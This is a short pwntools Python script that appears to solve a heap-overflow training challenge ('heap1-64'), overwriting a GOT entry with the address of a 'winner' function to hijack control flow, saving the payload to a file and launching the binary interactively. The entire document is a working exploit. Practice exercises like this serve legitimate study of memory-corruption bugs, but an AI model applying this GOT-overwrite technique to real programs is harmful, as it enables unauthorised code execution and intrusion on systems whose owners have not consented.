from pwn import *

context.clear(arch='amd64')

offset_ptr = 56
winner_addr = 0x400697
got_addr = 0x601020

arg1 = flat({offset_ptr:p32(got_addr)})
arg2 = p32(winner_addr)

exploit_file = open('exploit.in', 'w')
exploit_file.write(arg1)
exploit_file.write(arg2)

p = process(['./heap1-64', arg1, arg2])
p.interactive()
p.corefile
